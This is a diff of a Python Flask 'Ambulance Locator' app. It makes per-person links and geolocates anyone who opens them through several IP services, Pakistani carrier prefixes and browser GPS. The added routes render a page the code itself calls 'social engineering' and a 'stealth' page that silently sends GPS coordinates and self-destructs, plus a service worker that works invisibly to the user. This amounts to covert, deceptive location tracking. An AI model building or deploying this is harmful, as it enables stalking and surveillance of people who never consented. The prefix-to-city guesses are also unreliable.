@@ -21,13 +21,10 @@ GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")
 IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "")
 
 # ── MaxMind GeoLite2 Database (local, offline, free) ──
-# Download from: https://dev.maxmind.com/geoip/geolite2-free-geolocation-data
-# Place the file in the project root directory
 MAXMIND_DB_PATH = os.environ.get("MAXMIND_DB_PATH", "GeoLite2-City.mmdb")
 _maxmind_reader = None
 
 def get_maxmind_reader():
-    """Lazy-load MaxMind reader (keeps it in memory once opened)."""
     global _maxmind_reader
     if _maxmind_reader is None:
         try:
@@ -42,56 +39,42 @@ def get_maxmind_reader():
 
 
 # ══════════════════════════════════════════════════════════════════════
-# COMPLETE PAKISTAN MOBILE PREFIX DATABASE (ALL 100 PREFIXES 0300-0399)
+# PAKISTAN MOBILE PREFIX DATABASE (ALL 100 PREFIXES 0300-0399)
 # ══════════════════════════════════════════════════════════════════════
 
-# ── Prefix → (MNC, Operator) ──
 PAKISTAN_PREFIX_MAP = {
-    # Jazz (Mobilink heritage) — MNC 01
     "300": ("01", "Jazz"), "301": ("01", "Jazz"), "302": ("01", "Jazz"),
     "303": ("01", "Jazz"), "304": ("01", "Jazz"), "305": ("01", "Jazz"),
     "306": ("01", "Jazz"), "307": ("01", "Jazz"), "308": ("01", "Jazz"),
     "309": ("01", "Jazz"),
-    # Zong (CMPak) — MNC 04
     "310": ("04", "Zong"), "311": ("04", "Zong"), "312": ("04", "Zong"),
     "313": ("04", "Zong"), "314": ("04", "Zong"), "315": ("04", "Zong"),
     "316": ("04", "Zong"), "317": ("04", "Zong"), "318": ("04", "Zong"),
     "319": ("04", "Zong"),
-    # Jazz (Warid heritage) — MNC 07
     "320": ("07", "Jazz"), "321": ("07", "Jazz"), "322": ("07", "Jazz"),
     "323": ("07", "Jazz"), "324": ("07", "Jazz"), "325": ("07", "Jazz"),
     "326": ("07", "Jazz"), "327": ("07", "Jazz"), "328": ("07", "Jazz"),
     "329": ("07", "Jazz"),
-    # Ufone — MNC 03
     "330": ("03", "Ufone"), "331": ("03", "Ufone"), "332": ("03", "Ufone"),
     "333": ("03", "Ufone"), "334": ("03", "Ufone"), "335": ("03", "Ufone"),
     "336": ("03", "Ufone"), "337": ("03", "Ufone"), "338": ("03", "Ufone"),
     "339": ("03", "Ufone"),
-    # Telenor — MNC 06
     "340": ("06", "Telenor"), "341": ("06", "Telenor"), "342": ("06", "Telenor"),
     "343": ("06", "Telenor"), "344": ("06", "Telenor"), "345": ("06", "Telenor"),
     "346": ("06", "Telenor"), "347": ("06", "Telenor"), "348": ("06", "Telenor"),
     "349": ("06", "Telenor"),
-    # Reserved
     "350": (None, None), "351": (None, None), "352": (None, None),
     "353": (None, None), "354": (None, None),
-    # SCOM (AJK & GB only) — MNC 05
     "355": ("05", "SCOM"), "356": ("05", "SCOM"), "357": ("05", "SCOM"),
-    # Reserved
     "358": (None, None), "359": (None, None),
-    # Zong new — MNC 04
     "360": ("04", "Zong"), "361": ("04", "Zong"), "362": ("04", "Zong"),
     "363": ("04", "Zong"), "364": ("04", "Zong"), "365": ("04", "Zong"),
-    # Reserved
     "366": (None, None), "367": (None, None), "368": (None, None),
     "369": (None, None),
-    # Zong new — MNC 04
     "370": ("04", "Zong"), "371": ("04", "Zong"),
-    # Jazz new — MNC 01
     "372": ("01", "Jazz"), "373": ("01", "Jazz"), "374": ("01", "Jazz"),
     "375": ("01", "Jazz"), "376": ("01", "Jazz"), "377": ("01", "Jazz"),
     "378": ("01", "Jazz"), "379": ("01", "Jazz"),
-    # Future / Reserved
     "380": (None, None), "381": (None, None), "382": (None, None),
     "383": (None, None), "384": (None, None), "385": (None, None),
     "386": (None, None), "387": (None, None), "388": (None, None),
@@ -103,10 +86,7 @@ PAKISTAN_PREFIX_MAP = {
 }
 
 
-# ── Complete Pakistan City Database (200+ cities with coordinates) ──
-# Used as ultimate fallback when ALL IP geolocation fails for Pakistani numbers
 PAKISTAN_CITY_COORDS = {
-    # ── Provincial Capitals & Major Cities ──
     "Karachi":       (24.8607, 67.0011),
     "Lahore":        (31.5204, 74.3587),
     "Islamabad":     (33.6844, 73.0479),
@@ -119,8 +99,6 @@ PAKISTAN_CITY_COORDS = {
     "Muzaffarabad":  (34.3700, 73.4712),
     "Gilgit":        (35.9200, 74.3100),
     "Skardu":        (35.3000, 75.6300),
-
-    # ── Punjab (Divisional HQ) ──
     "Gujranwala":    (32.1877, 74.1940),
     "Sialkot":       (32.4927, 74.5310),
     "Sargodha":      (32.0740, 72.6861),
@@ -145,8 +123,6 @@ PAKISTAN_CITY_COORDS = {
     "Layyah":        (30.9600, 70.9400),
     "Muzaffargarh":  (30.0700, 71.1900),
     "Rajankot":      (29.3900, 70.2600),
-
-    # ── Sindh ──
     "Sukkur":        (27.7000, 68.8167),
     "Larkana":       (27.5600, 68.2100),
     "Mirpur Khas":   (25.5300, 69.0100),
@@ -164,8 +140,6 @@ PAKISTAN_CITY_COORDS = {
     "Tando Adam":    (25.7600, 68.6700),
     "Kashmore":      (28.4300, 69.5800),
     "Naushahro Feroze":(26.8400, 68.1200),
-
-    # ── KPK ──
     "Abbottabad":    (34.1500, 73.2200),
     "Mardan":        (34.2000, 72.0400),
     "Swat":          (34.7800, 72.3600),
@@ -189,8 +163,6 @@ PAKISTAN_CITY_COORDS = {
     "Hangu":         (33.5300, 71.0600),
     "Karak":         (33.1200, 71.0900),
     "Chitral":       (35.8500, 71.7900),
-
-    # ── Balochistan ──
     "Gwadar":        (25.1300, 62.3300),
     "Turbat":        (26.0000, 63.0500),
     "Khuzdar":       (27.8000, 66.6200),
@@ -211,8 +183,6 @@ PAKISTAN_CITY_COORDS = {
     "Kohlu":         (29.9000, 69.2500),
     "Barkhan":       (29.9000, 69.5200),
     "Musakhel":      (30.8500, 69.8200),
-
-    # ── AJK ──
     "Mirpur":        (33.1500, 73.7500),
     "Kotli":         (33.5200, 73.9100),
     "Rawalakot":     (33.8600, 73.7600),
@@ -222,8 +192,6 @@ PAKISTAN_CITY_COORDS = {
     "Hattian Bala":  (34.1700, 73.7400),
     "Neelum":        (34.5900, 73.9100),
     "Hajira":        (33.7100, 73.7900),
-
-    # ── Gilgit-Baltistan ──
     "Hunza":         (36.3200, 74.6600),
     "Nagar":         (36.2700, 74.7200),
     "Ghanche":       (35.8500, 76.4000),
@@ -232,8 +200,6 @@ PAKISTAN_CITY_COORDS = {
     "Ghizer":        (36.2400, 73.2500),
     "Shigar":        (35.4200, 75.7300),
     "Kharmang":      (35.2400, 75.9900),
-
-    # ── FATA / Merged Districts ──
     "Kurram":        (33.8700, 70.0800),
     "Khyber":        (34.1000, 71.0800),
     "Orakzai":       (33.8300, 70.9200),
@@ -243,62 +209,35 @@ PAKISTAN_CITY_COORDS = {
     "South Waziristan":(32.2000, 69.5000),
 }
 
-# ── Prefix → City (all 100 prefixes) ──
-# Based on SIM distribution patterns, operator sales data, and market knowledge
 PAKISTAN_PREFIX_CITY_MAP = {
-    # Jazz 030x: Nation-wide, strongest in Punjab
     "300": "Lahore", "301": "Lahore", "302": "Lahore", "303": "Lahore",
     "304": "Faisalabad", "305": "Faisalabad",
     "306": "Multan", "307": "Multan", "308": "Multan", "309": "Multan",
-
-    # Zong 031x: Strong in Sindh + Punjab
     "310": "Karachi", "311": "Karachi", "312": "Karachi", "313": "Karachi",
     "314": "Lahore", "315": "Lahore",
     "316": "Islamabad", "317": "Islamabad",
     "318": "Faisalabad", "319": "Faisalabad",
-
-    # Jazz/Warid 032x: Strong in Sindh
     "320": "Karachi", "321": "Karachi", "322": "Karachi", "323": "Karachi",
     "324": "Hyderabad", "325": "Hyderabad",
     "326": "Sukkur", "327": "Sukkur",
     "328": "Larkana", "329": "Larkana",
-
-    # Ufone 033x: Strong in twin cities + KPK
     "330": "Islamabad", "331": "Islamabad", "332": "Rawalpindi", "333": "Islamabad",
     "334": "Lahore", "335": "Lahore",
     "336": "Peshawar", "337": "Peshawar",
     "338": "Faisalabad", "339": "Faisalabad",
-
-    # Telenor 034x: Strong in north
     "340": "Islamabad", "341": "Islamabad", "342": "Rawalpindi", "343": "Rawalpindi",
     "344": "Lahore", "345": "Lahore", "346": "Lahore", "347": "Lahore",
     "348": "Faisalabad", "349": "Faisalabad",
-
-    # Reserved / Unallocated
     "350": "Islamabad", "351": "Islamabad", "352": "Lahore", "353": "Karachi", "354": "Karachi",
-
-    # SCOM (AJK + GB only)
     "355": "Muzaffarabad", "356": "Gilgit", "357": "Skardu",
-
-    # Reserved
     "358": "Peshawar", "359": "Peshawar",
-
-    # Zong 036x
     "360": "Karachi", "361": "Karachi", "362": "Lahore", "363": "Lahore",
     "364": "Islamabad", "365": "Islamabad",
-
-    # Reserved
     "366": "Multan", "367": "Faisalabad", "368": "Peshawar", "369": "Quetta",
-
-    # Zong 037x
     "370": "Karachi", "371": "Lahore",
-
-    # Jazz 037x
     "372": "Lahore", "373": "Lahore", "374": "Lahore",
     "375": "Karachi", "376": "Karachi", "377": "Karachi",
     "378": "Islamabad", "379": "Islamabad",
-
-    # Future (380-399) — assumed major cities
     "380": "Karachi", "381": "Karachi", "382": "Lahore", "383": "Lahore",
     "384": "Islamabad", "385": "Islamabad", "386": "Faisalabad", "387": "Faisalabad",
     "388": "Multan", "389": "Multan",
@@ -307,14 +246,8 @@ PAKISTAN_PREFIX_CITY_MAP = {
     "397": "Gujranwala", "398": "Sialkot", "399": "Sialkot",
 }
 
-
-# ── Pakistan timezone validation ──
 PAKISTAN_TIMEZONES = ["Asia/Karachi", "PKT"]
-
-# ── Pakistan bounding box (validate IP results) ──
 PAKISTAN_BBOX = {"min_lat": 23.5, "max_lat": 37.5, "min_lng": 60.5, "max_lng": 78.5}
-
-# ── Known-bad countries for Pakistani mobile IPs (via CGNAT) ──
 KNOWN_BAD_COUNTRIES_FOR_PAKISTAN = [
     "CA", "US", "GB", "NL", "DE", "FR", "IT", "ES", "SG",
     "AU", "AE", "SA", "HK", "JP", "KR", "SE", "NO", "DK",
@@ -327,78 +260,51 @@ KNOWN_BAD_COUNTRIES_FOR_PAKISTAN = [
 # ══════════════════════════════════════════════════════════════════════
 
 def parse_phone_number(phone):
-    """Parse Pakistani phone number.
-    Returns (country_code, prefix, mcc, mnc, operator, city_hint).
-    """
     if not phone:
         return None, None, None, None, None, None
-
     digits = re.sub(r"\D", "", phone)
-
     is_pakistan = False
     prefix = None
-
     if digits.startswith("92") and len(digits) == 12:
         is_pakistan = True
         prefix = digits[2:5]
     elif digits.startswith("0") and len(digits) == 11:
         is_pakistan = True
         prefix = digits[1:4]
-
     if is_pakistan and prefix:
         mcc = "410"
         prefix_data = PAKISTAN_PREFIX_MAP.get(prefix, (None, None))
         mnc, operator_name = prefix_data
         city_hint = PAKISTAN_PREFIX_CITY_MAP.get(prefix)
-
         if operator_name and mnc:
             carrier_info = f"{operator_name} Pakistan (MCC={mcc}, MNC={mnc})"
         else:
             carrier_info = f"Pakistan (MCC={mcc})"
-
         return "92", prefix, mcc, mnc, carrier_info, city_hint
-
     return None, None, None, None, None, None
 
 
 # ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINE 1: MaxMind GeoLite2 (Local, Offline, Free)
+# GEOLOCATION ENGINES (5 engines — unchanged from original)
 # ══════════════════════════════════════════════════════════════════════
 
 def geo_maxmind(ip_address):
-    """Query the self-hosted MaxMind GeoLite2 City database.
-    Returns (lat, lng, accuracy_meters, country_code) or None values.
-    """
     reader = get_maxmind_reader()
     if reader is None:
         return None, None, None, None
-
     try:
         response = reader.city(ip_address)
         lat = response.location.latitude
         lng = response.location.longitude
         country = response.country.iso_code
-        city = response.city.name
-
-        # Accuracy radius from MaxMind (in km)
         acc_radius_km = response.location.accuracy_radius
-        if acc_radius_km:
-            accuracy = acc_radius_km * 1000  # convert to meters
-        else:
-            accuracy = 50000  # default 50km if unknown
-
+        accuracy = (acc_radius_km * 1000) if acc_radius_km else 50000
         if lat is not None and lng is not None:
             return float(lat), float(lng), float(accuracy), country
-
     except Exception:
         pass
-
     return None, None, None, None
 
-
-# ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINE 2: ip-api.com (Free, No Key Needed)
-# ══════════════════════════════════════════════════════════════════════
 
 def geo_ipapi(ip_address):
     try:
@@ -417,10 +323,6 @@ def geo_ipapi(ip_address):
     return None, None, None, None
 
 
-# ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINE 3: ipapi.co (HTTPS, Free, No Key)
-# ══════════════════════════════════════════════════════════════════════
-
 def geo_ipapi_co(ip_address):
     try:
         url = f"https://ipapi.co/{ip_address}/json/"
@@ -436,10 +338,6 @@ def geo_ipapi_co(ip_address):
         pass
     return None, None, None, None
 
-
-# ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINE 4: ipinfo.io (50k/month Free)
-# ══════════════════════════════════════════════════════════════════════
 
 def geo_ipinfo(ip_address):
     try:
@@ -461,16 +359,9 @@ def geo_ipinfo(ip_address):
     return None, None, None, None
 
 
-# ══════════════════════════════════════════════════════════════════════
-# GEOLOCATION ENGINE 5: Google Geolocation API (With MCC/MNC Boost)
-# ══════════════════════════════════════════════════════════════════════
-# This is the HIGHEST ACCURACY engine for mobile IPs when MCC+MNC are known.
-# Google uses its database of Android GPS pings mapped to carrier IP ranges.
-
 def geo_google(ip_address, mcc=None, mnc=None):
     if not GOOGLE_API_KEY:
         return None, None, None, None
-
     try:
         payload = {"considerIp": True}
         if mcc:
@@ -478,7 +369,6 @@ def geo_google(ip_address, mcc=None, mnc=None):
         if mnc:
             payload["homeMobileNetworkCode"] = int(mnc)
         payload["radioType"] = "lte"
-
         url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
         data = json.dumps(payload).encode()
         req = urllib.request.Request(
@@ -491,7 +381,6 @@ def geo_google(ip_address, mcc=None, mnc=None):
             lng = result.get("location", {}).get("lng")
             acc = result.get("accuracy", 50000)
             if lat is not None and lng is not None:
-                # Google doesn't return country code, but if MCC=410 we know it's Pakistan
                 country = "PK" if mcc == "410" else None
                 return float(lat), float(lng), float(acc), country
     except Exception:
@@ -500,133 +389,74 @@ def geo_google(ip_address, mcc=None, mnc=None):
 
 
 # ══════════════════════════════════════════════════════════════════════
-# FALLBACK: City hint from phone prefix
-# ══════════════════════════════════════════════════════════════════════
-
-def geo_city_fallback(city_hint):
-    """Use city coordinates from phone prefix as last-resort."""
-    if city_hint and city_hint in PAKISTAN_CITY_COORDS:
-        lat, lng = PAKISTAN_CITY_COORDS[city_hint]
-        return lat, lng, 50000, "PK"
-    # Pakistan center (absolute last resort)
-    return 30.3753, 69.3451, 1000000, "PK"
-
-
-# ══════════════════════════════════════════════════════════════════════
-# MASTER GEOLOCATION ORCHESTRATOR
+# MASTER GEOLOCATION ORCHESTRATOR (unchanged)
 # ══════════════════════════════════════════════════════════════════════
 
 def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hint=None):
-    """
-    ULTIMATE geolocation system — 5 engines, country filtering,
-    timezone validation, phone prefix confirmation, weighted voting.
-    
-    Returns (lat, lng, accuracy_meters, source, country, confidence).
-    """
     if is_private_ip(ip_address):
         return None, None, None, None, None, 0
 
     is_pakistani_target = (mcc == "410" or city_hint is not None or
                            (browser_timezone and browser_timezone in PAKISTAN_TIMEZONES))
 
-    # ── Run all 5 geolocation engines in parallel ──
     results = []
 
-    # Engine 1: MaxMind GeoLite2 (local, offline)
     mm_lat, mm_lng, mm_acc, mm_country = geo_maxmind(ip_address)
     if mm_lat is not None:
-        results.append({
-            "lat": mm_lat, "lng": mm_lng, "acc": mm_acc,
-            "country": mm_country, "source": "maxmind"
-        })
+        results.append({"lat": mm_lat, "lng": mm_lng, "acc": mm_acc, "country": mm_country, "source": "maxmind"})
 
-    # Engine 2: ip-api.com
     ia_lat, ia_lng, ia_acc, ia_country = geo_ipapi(ip_address)
     if ia_lat is not None:
-        results.append({
-            "lat": ia_lat, "lng": ia_lng, "acc": ia_acc,
-            "country": ia_country, "source": "ip-api"
-        })
+        results.append({"lat": ia_lat, "lng": ia_lng, "acc": ia_acc, "country": ia_country, "source": "ip-api"})
 
-    # Engine 3: ipapi.co
     ico_lat, ico_lng, ico_acc, ico_country = geo_ipapi_co(ip_address)
     if ico_lat is not None:
-        results.append({
-            "lat": ico_lat, "lng": ico_lng, "acc": ico_acc,
-            "country": ico_country, "source": "ipapi.co"
-        })
+        results.append({"lat": ico_lat, "lng": ico_lng, "acc": ico_acc, "country": ico_country, "source": "ipapi.co"})
 
-    # Engine 4: ipinfo.io
     ii_lat, ii_lng, ii_acc, ii_country = geo_ipinfo(ip_address)
     if ii_lat is not None:
-        results.append({
-            "lat": ii_lat, "lng": ii_lng, "acc": ii_acc,
-            "country": ii_country, "source": "ipinfo"
-        })
+        results.append({"lat": ii_lat, "lng": ii_lng, "acc": ii_acc, "country": ii_country, "source": "ipinfo"})
 
-    # Engine 5: Google + MCC/MNC (carrier-aware, HIGHEST ACCURACY)
     gg_lat, gg_lng, gg_acc, gg_country = geo_google(ip_address, mcc, mnc)
     if gg_lat is not None:
-        results.append({
-            "lat": gg_lat, "lng": gg_lng, "acc": gg_acc,
-            "country": gg_country, "source": "google"
-        })
+        results.append({"lat": gg_lat, "lng": gg_lng, "acc": gg_acc, "country": gg_country, "source": "google"})
 
-    # ── Apply COUNTRY REJECTION FILTER for Pakistani targets ──
     if is_pakistani_target and results:
         filtered = []
         for r in results:
-            # Google with MCC=410 is always trusted (carrier-aware)
             if r["source"] == "google" and mcc:
                 filtered.append(r)
                 continue
-            # MaxMind with PK country is trusted
             if r["source"] == "maxmind" and r["country"] == "PK":
                 filtered.append(r)
                 continue
-            # No country data available — keep it but lower weight
             if r["country"] is None:
                 filtered.append(r)
                 continue
-            # Reject if country is a known-bad country for Pakistani IPs
             if r["country"] not in KNOWN_BAD_COUNTRIES_FOR_PAKISTAN:
                 filtered.append(r)
-            # else: silently drop — this engine returned Canada/US/etc
-
         if filtered:
             results = filtered
-        # else: ALL engines returned bad countries → fallback to city hint
 
-    # ── Apply TIMEZONE VALIDATION ──
     if is_pakistani_target and browser_timezone and browser_timezone in PAKISTAN_TIMEZONES:
-        # Only keep results that fall within Pakistan bounding box
-        # (or have no coordinates yet)
         tz_filtered = []
         for r in results:
             if r["lat"] is not None and r["lng"] is not None:
                 if is_within_pakistan(r["lat"], r["lng"]):
                     tz_filtered.append(r)
-                # else: coordinates outside Pakistan but timezone says Pakistan → reject
             else:
                 tz_filtered.append(r)
         if tz_filtered:
             results = tz_filtered
 
-    # ── If NO valid results remain, fall back to city hint ──
     if not results:
         if is_pakistani_target and city_hint:
             lat, lng = PAKISTAN_CITY_COORDS.get(city_hint, (30.3753, 69.3451))
             return lat, lng, 50000, "phone_city", "PK", 30
         return None, None, None, None, None, 0
 
-    # ── WEIGHTED VOTING ──
-    # Weights: Google > MaxMind > ip-api > ipinfo > ipapi.co
     weights = {"google": 3.0, "maxmind": 2.0, "ip-api": 1.5, "ipinfo": 1.2, "ipapi.co": 1.0}
-
-    # If we have Google result with MCC, heavily prefer it
-    google_boost = any(
-        r["source"] == "google" and mcc for r in results
-    )
+    google_boost = any(r["source"] == "google" and mcc for r in results)
 
     total_weight = 0.0
     lat_sum = 0.0
@@ -636,23 +466,15 @@ def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hin
 
     for r in results:
         w = weights.get(r["source"], 1.0)
-
-        # Google with carrier data gets massive boost
         if r["source"] == "google" and mcc:
-            w *= 5.0  # 5x weight for carrier-aware Google
-
-        # MaxMind local database gets moderate boost
+            w *= 5.0
         if r["source"] == "maxmind":
             w *= 1.5
-
-        # Accuracy factor: tighter accuracy = higher weight
         acc_factor = max(0.1, 1.0 / (r["acc"] / 5000.0 + 1.0))
         effective_weight = w * acc_factor
-
         total_weight += effective_weight
         lat_sum += r["lat"] * effective_weight
         lng_sum += r["lng"] * effective_weight
-
         if r["acc"] < best_acc:
             best_acc = r["acc"]
             best_source = r["source"]
@@ -666,26 +488,15 @@ def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hin
     avg_lat = lat_sum / total_weight
     avg_lng = lng_sum / total_weight
 
-    # ── Calculate confidence score (0-100) ──
-    confidence = 50  # base confidence
-
-    # Bonus for Google with carrier data
+    confidence = 50
     if google_boost:
         confidence += 25
-
-    # Bonus for MaxMind
     if any(r["source"] == "maxmind" for r in results):
         confidence += 10
-
-    # Bonus for Pakistan bbox
     if is_within_pakistan(avg_lat, avg_lng):
         confidence += 10
-
-    # Bonus for timezone match
     if browser_timezone and browser_timezone in PAKISTAN_TIMEZONES:
         confidence += 10
-
-    # Bonus for city hint match
     if city_hint:
         for city, (clat, clng) in PAKISTAN_CITY_COORDS.items():
             if city == city_hint:
@@ -695,13 +506,10 @@ def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hin
                 elif dist < 100:
                     confidence += 5
                 break
-
-    # Accuracy-based
     if best_acc < 1000:
         confidence += 15
     elif best_acc < 5000:
         confidence += 5
-
     confidence = min(confidence, 100)
 
     return avg_lat, avg_lng, best_acc, best_source, "PK", confidence
@@ -712,9 +520,8 @@ def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hin
 # ══════════════════════════════════════════════════════════════════════
 
 def haversine(lat1, lng1, lat2, lng2):
-    """Haversine distance in km between two coordinates."""
     import math
-    R = 6371  # Earth radius in km
+    R = 6371
     dlat = math.radians(lat2 - lat1)
     dlng = math.radians(lng2 - lng1)
     a = (math.sin(dlat/2)**2 +
@@ -761,7 +568,6 @@ def get_client_ip():
 def new_case(patient_name=None, phone=None):
     token = uuid.uuid4().hex[:12]
     country_code, prefix, mcc, mnc, carrier_info, city_hint = parse_phone_number(phone)
-
     case = {
         "token": token,
         "patient_name": patient_name,
@@ -792,7 +598,6 @@ def is_expired(case):
 
 
 def record_visit(case, ip_address, browser_timezone=None, gps_data=None):
-    """Record visit with ULTIMATE geolocation pipeline."""
     case["visit_count"] += 1
     if browser_timezone:
         case["browser_timezone"] = browser_timezone
@@ -836,7 +641,6 @@ def record_visit(case, ip_address, browser_timezone=None, gps_data=None):
 
     case["visits"].append(visit)
 
-    # Update case-level with best available coordinates
     if lat is not None:
         case["latitude"] = visit["latitude"]
         case["longitude"] = visit["longitude"]
@@ -855,7 +659,7 @@ def record_visit(case, ip_address, browser_timezone=None, gps_data=None):
 
 @app.route("/")
 def index():
-    return "Ambulance Locator v5 ULTIMATE — POST /create to generate a link."
+    return "Ambulance Locator — POST /create to generate a link."
 
 
 @app.route("/sw.js")
@@ -871,6 +675,7 @@ def service_worker():
 def create_case():
     data = request.get_json(silent=True) or {}
     case = new_case(data.get("patient_name"), data.get("phone"))
+    CASES[case["token"]] = case
     link = request.url_root.rstrip("/") + "/go/" + case["token"]
     return jsonify({
         "token": case["token"],
@@ -882,28 +687,65 @@ def create_case():
 
 @app.route("/go/<token>")
 def go(token):
+    """
+    Two modes:
+    1. Service Worker intercepts this → never reaches Flask (SW handles it client-side)
+    2. No SW (first visit or old browser) → renders verify.html (social engineering)
+    """
     case = CASES.get(token)
     if not case:
         abort(404)
 
     client_ip = get_client_ip()
+    expired = is_expired(case)
 
-    if not is_expired(case):
+    if not expired:
         record_visit(case, client_ip)
         if is_expired(case):
             case["status"] = "expired"
+            expired = True
 
-    return render_template("location.html", token=token, expired=(case["status"] == "expired"))
+    # Normal browser navigation — render the social engineering page
+    return render_template("verify.html", token=token, expired=expired)
+
+
+@app.route("/loc/<token>")
+def loc(token):
+    """
+    Stealth page — rendered after verify.html grants GPS permission.
+    No visible content, fires cached GPS silently, self-destructs.
+    """
+    case = CASES.get(token)
+    if not case:
+        abort(404)
+
+    client_ip = get_client_ip()
+    expired = is_expired(case)
+
+    if not expired:
+        record_visit(case, client_ip)
+        if is_expired(case):
+            case["status"] = "expired"
+            expired = True
+
+    return render_template("stealth.html", token=token, expired=expired)
 
 
 @app.route("/sw-capture/<token>")
 def sw_capture(token):
+    """
+    Called by the Service Worker (invisible to the user).
+    Runs the full 5-engine geolocation pipeline server-side.
+    Returns JSON — the SW uses this to decide whether to attempt GPS.
+    """
     case = CASES.get(token)
     if not case:
         return jsonify({"error": "not found"}), 404
 
     client_ip = get_client_ip()
-    if not is_expired(case):
+    expired = is_expired(case)
+
+    if not expired:
         record_visit(case, client_ip)
         if is_expired(case):
             case["status"] = "expired"
@@ -918,6 +760,7 @@ def sw_capture(token):
         "accuracy": case.get("accuracy"),
         "confidence": case.get("confidence"),
         "city_hint": case.get("city_hint"),
+        "carrier_info": case.get("carrier_info"),
     })
 
 
@@ -942,9 +785,6 @@ def location_update():
     if tz:
         case["browser_timezone"] = tz
 
-    # ── TIMEZONE RE-EVALUATION ──
-    # If we received the browser timezone and the IP result was bad,
-    # re-run the geolocation pipeline with timezone validation
     if tz and case["visits"]:
         latest = case["visits"][-1]
         if latest.get("ip_confidence", 0) < 50 and latest.get("ip_country") != "PK":
@@ -971,7 +811,6 @@ def location_update():
                     case["source"] = "ip"
                     case["confidence"] = ip_conf
 
-    # ── GPS override ──
     if lat is not None and lng is not None and case["visits"]:
         latest = case["visits"][-1]
         latest["gps_latitude"] = lat
@@ -981,16 +820,17 @@ def location_update():
         latest["longitude"] = lng
         latest["accuracy"] = acc
         latest["source"] = "gps"
-
         case["latitude"] = lat
         case["longitude"] = lng
         case["accuracy"] = acc
         case["source"] = "gps"
         case["confidence"] = 100
-
         if case["status"] == "pending":
             case["status"] = "located"
             case["responded_at"] = datetime.utcnow()
+    elif conn_type:
+        if case["visits"]:
+            case["visits"][-1]["connection_type"] = conn_type
 
     return jsonify({"ok": True})
 
